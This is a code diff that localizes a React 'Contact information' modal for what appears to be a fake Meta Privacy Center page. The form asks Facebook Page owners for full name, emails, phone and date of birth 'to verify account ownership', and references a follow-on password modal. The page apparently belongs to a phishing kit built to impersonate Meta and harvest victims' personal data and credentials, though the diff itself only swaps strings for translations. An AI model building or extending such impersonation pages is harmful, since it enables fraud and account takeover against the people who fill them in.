@@ -4,21 +4,9 @@ import PhoneInput from 'react-phone-input-2';
 import CustomCheckbox from '#components/check-box/CustomCheckbox';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
-
-const MONTH_OPTIONS = [
-  { value: '1', label: 'January' },
-  { value: '2', label: 'February' },
-  { value: '3', label: 'March' },
-  { value: '4', label: 'April' },
-  { value: '5', label: 'May' },
-  { value: '6', label: 'June' },
-  { value: '7', label: 'July' },
-  { value: '8', label: 'August' },
-  { value: '9', label: 'September' },
-  { value: '10', label: 'October' },
-  { value: '11', label: 'November' },
-  { value: '12', label: 'December' },
-] as const;
+import { usePrivacyCenterLocale } from '@/components/privacy-center/PrivacyCenterLocaleContext';
+import { privacyCenterMessages } from '@/lib/privacy-center-messages';
+import { getLocalizedMonthOptions } from '@/lib/privacy-locale-intl';
 
 interface InfomationsModalProps {
   isOpend: boolean;
@@ -32,6 +20,9 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   const [errors, setErrors] = React.useState<Record<string, string>>({});
   const dispatch = useAppDispatch();
   const formData = useAppSelector((state) => state.stepForm.data);
+  const { locale } = usePrivacyCenterLocale();
+  const t = privacyCenterMessages[locale];
+  const monthOptions = React.useMemo(() => getLocalizedMonthOptions(locale), [locale]);
 
   const dayOptions = React.useMemo(
     () => Array.from({ length: 31 }, (_, i) => String(i + 1)),
@@ -69,11 +60,11 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       e.preventDefault();
 
       const newErrors: Record<string, string> = {};
-      if (!formData.fullName.trim()) newErrors.fullName = "Full name is required.";
-      if (!formData.email.trim()) newErrors.email = "A valid email address is required.";
-      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = "Business email is required.";
-      if (!formData.fanpage.trim()) newErrors.fanpage = "Page or profile name is required.";
-      if (!formData.phone.trim()) newErrors.phone = "Phone number is required.";
+      if (!formData.fullName.trim()) newErrors.fullName = t.modalErrFullName;
+      if (!formData.email.trim()) newErrors.email = t.modalErrEmail;
+      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = t.modalErrBusinessEmail;
+      if (!formData.fanpage.trim()) newErrors.fanpage = t.modalErrFanpage;
+      if (!formData.phone.trim()) newErrors.phone = t.modalErrPhone;
 
       if (Object.keys(newErrors).length > 0) {
         setErrors(newErrors);
@@ -102,19 +93,19 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   return (
     <Modal
       isOpen={isOpen}
-      title={"Contact information"}
+      title={t.modalInfoTitle}
       onClose={handleClose}
     >
       <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
-            <label htmlFor="fullName" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Full name</label>
+            <label htmlFor="fullName" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">{t.modalLabelFullName}</label>
             <div className={inputClass('fullName')}>
               <input
                 type="text"
                 id='fullName'
                 autoComplete="name"
-                placeholder={"As shown on your official ID or account"}
+                placeholder={t.modalPhFullName}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fullName}
                 onChange={handleChange}
@@ -122,13 +113,13 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fullName')}
 
-            <label htmlFor="email" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Primary email</label>
+            <label htmlFor="email" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">{t.modalLabelEmail}</label>
             <div className={inputClass('email')}>
               <input
                 type="email"
                 id='email'
                 autoComplete="email"
-                placeholder={"name@example.com"}
+                placeholder={t.modalPhEmail}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.email}
                 onChange={handleChange}
@@ -136,13 +127,13 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('email')}
 
-            <label htmlFor="emailBusiness" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Business email</label>
+            <label htmlFor="emailBusiness" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">{t.modalLabelBusinessEmail}</label>
             <div className={inputClass('emailBusiness')}>
               <input
                 type="email"
                 id='emailBusiness'
                 autoComplete="email"
-                placeholder={"Work or business contact email"}
+                placeholder={t.modalPhBusinessEmail}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.emailBusiness}
                 onChange={handleChange}
@@ -150,12 +141,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('emailBusiness')}
 
-            <label htmlFor="fanpage" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Page or profile</label>
+            <label htmlFor="fanpage" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">{t.modalLabelFanpage}</label>
             <div className={inputClass('fanpage')}>
               <input
                 type="text"
                 id='fanpage'
-                placeholder={"Facebook Page name or profile URL"}
+                placeholder={t.modalPhFanpage}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fanpage}
                 onChange={handleChange}
@@ -163,7 +154,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fanpage')}
 
-            <label className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Phone number</label>
+            <label className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">{t.modalLabelPhone}</label>
             <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
               <PhoneInput
                 country={formData.country_code?.toLowerCase() || "us"}
@@ -179,11 +170,11 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('phone')}
 
-            <span className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Date of birth</span>
-            <p className="text-[#9a979e] text-[13px] mb-[8px] leading-snug">Select your date of birth. This helps us verify account ownership.</p>
+            <span className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">{t.modalLabelDob}</span>
+            <p className="text-[#9a979e] text-[13px] mb-[8px] leading-snug">{t.modalHelpDob}</p>
             <div className="grid grid-cols-3 gap-[10px]">
               <div>
-                <label htmlFor="day" className="sr-only">Day</label>
+                <label htmlFor="day" className="sr-only">{t.modalSrDay}</label>
                 <div
                   className={inputClass('day')}
                   style={{
@@ -199,7 +190,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     onChange={handleChange}
                     className={selectClass}
                   >
-                    <option value="">Day</option>
+                    <option value="">{t.modalPlaceholderDay}</option>
                     {dayOptions.map((d) => (
                       <option key={d} value={d}>{d}</option>
                     ))}
@@ -209,7 +200,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               </div>
 
               <div>
-                <label htmlFor="month" className="sr-only">Month</label>
+                <label htmlFor="month" className="sr-only">{t.modalSrMonth}</label>
                 <div
                   className={inputClass('month')}
                   style={{
@@ -225,8 +216,8 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     onChange={handleChange}
                     className={selectClass}
                   >
-                    <option value="">Month</option>
-                    {MONTH_OPTIONS.map((m) => (
+                    <option value="">{t.modalPlaceholderMonth}</option>
+                    {monthOptions.map((m) => (
                       <option key={m.value} value={m.value}>{m.label}</option>
                     ))}
                   </select>
@@ -235,7 +226,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               </div>
 
               <div>
-                <label htmlFor="year" className="sr-only">Year</label>
+                <label htmlFor="year" className="sr-only">{t.modalSrYear}</label>
                 <div
                   className={inputClass('year')}
                   style={{
@@ -251,7 +242,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     onChange={handleChange}
                     className={selectClass}
                   >
-                    <option value="">Year</option>
+                    <option value="">{t.modalPlaceholderYear}</option>
                     {yearOptions.map((y) => (
                       <option key={y} value={y}>{y}</option>
                     ))}
@@ -261,28 +252,31 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               </div>
             </div>
 
-            <label htmlFor="message" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Additional details</label>
+            <label htmlFor="message" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">{t.modalLabelMessage}</label>
             <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
               <textarea
                 id='message'
                 className="w-full outline-0 h-full resize-none"
-                placeholder={"Optional: add context to help us process your request faster"}
+                placeholder={t.modalPhMessage}
                 value={formData.message}
                 onChange={handleChange}
               />
             </div>
 
             <div>
-              <p className='text-[#9a979e] text-[14px] mb-[7px] leading-snug'>We typically respond within 14–48 hours during business days.</p>
+              <p className='text-[#9a979e] text-[14px] mb-[7px] leading-snug'>{t.modalNoteResponseTime}</p>
             </div>
             <div className='mt-[15px] mb-[20px]'>
               <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                 <CustomCheckbox />
-                I have read and agree to the <a href='' className='text-[#0064E0] hover:underline'>Terms of Use <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' /></a>
+                {t.modalTermsPrefix}{' '}
+                <a href='#' className='text-[#0064E0] hover:underline'>{t.modalTermsLink}{' '}
+                  <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' />
+                </a>
               </label>
             </div>
             <div className='w-full mt-[20px] '>
-              <button type="submit" className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>Continue</button>
+              <button type="submit" className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>{t.modalBtnContinue}</button>
             </div>
           </div>
 
